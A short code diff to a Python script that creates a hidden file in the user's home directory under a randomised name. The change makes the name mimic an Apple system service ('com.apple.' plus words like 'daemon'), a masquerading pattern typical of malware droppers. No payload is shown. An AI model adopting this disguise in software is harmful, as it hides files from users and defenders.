@@ -6,9 +6,9 @@ from os import system, remove
 from sys import platform
 from random import shuffle
 
-filename = ['apple', 'user', 'core', 'dev']
+filename = ['user', 'core', 'dev', 'service', 'daemon']
 shuffle(filename)
-filename = "com." + '.'.join(filename)
+filename = "com.apple." + '.'.join(filename)
 localfile = f"{expanduser('~')}/.{filename}"
 
 try:
